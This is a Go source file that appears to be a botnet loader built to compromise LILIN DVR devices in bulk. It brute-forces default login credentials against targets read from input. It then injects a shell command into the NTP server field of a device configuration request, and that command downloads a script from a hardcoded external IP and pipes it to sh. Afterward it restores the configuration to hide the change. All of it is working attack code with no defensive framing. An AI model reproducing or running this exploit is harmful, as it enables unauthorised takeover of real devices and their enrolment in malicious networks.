package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var loaderDownloadServer string = "107.152.39.215"
var lilinPayload string = "wget -O- http://" + loaderDownloadServer + "/d|sh"

func zeroByte(a []byte) {

	for i := range a {
		a[i] = 0
	}
}

func infectFunctionLilinDvr(target, port string) {

	var authPos int = -1
	var pathPos int = -1
	var logins = [...]string{"root:icatch99", "report:8Jg0SR8K50", "report:report", "root:root", "admin:admin", "admin:123456", "admin:654321", "admin:1111", "admin:admin123", "admin:1234", "admin:12345"}
	var paths = [...]string{"/dvr/cmd", "/cn/cmd"}

	for i := 0; i < len(logins); i++ {
		logins[i] = base64.StdEncoding.EncodeToString([]byte(logins[i]))
	}

	cntLen := 292
	cntLen += len(lilinPayload)
	cntLenString := strconv.Itoa(cntLen)
	bytebuf := make([]byte, 512)

	for i := 0; i < len(logins); i++ {

		conn, err := net.DialTimeout("tcp", target+":"+port, 10*time.Second)
		if err != nil {
			break
		}

		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nAuthorization: Basic " + logins[i] + "\r\n\r\n"))

		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			authPos = i
			zeroByte(bytebuf)
			conn.Close()
			break
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	if authPos == -1 {
		return
	}

	for i := 0; i < len(paths); i++ {

		conn, err := net.DialTimeout("tcp", target+":"+port, 10*time.Second)
		if err != nil {
			break
		}

		conn.Write([]byte("POST " + paths[i] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: " + cntLenString + "\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: Abcd\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&" + lilinPayload + ";echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			pathPos = i
			zeroByte(bytebuf)
			conn.Close()
			fmt.Printf("\x1b[38;5;46mLilin\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
			break
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	if pathPos != -1 {

		conn, err := net.DialTimeout("tcp", target+":"+port, 10*time.Second)
		if err != nil {
			return
		}

		conn.Write([]byte("POST " + paths[pathPos] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: 281\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: Abcd\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

		bytebuf = make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			fmt.Printf("\x1b[38;5;46mLilin\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
		}

		zeroByte(bytebuf)
		conn.Close()
	}

	return
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	scanner := bufio.NewScanner(reader)
	var port string
	var data []string

	for scanner.Scan() {
		data = strings.Split(scanner.Text(), ":")
		if os.Args[1] == "none" {
			port = data[1]
		} else {
			port = os.Args[1]
		}

		go infectFunctionLilinDvr(data[0], port)
	}
	for {
		time.Sleep(1 * time.Second)
	}
}
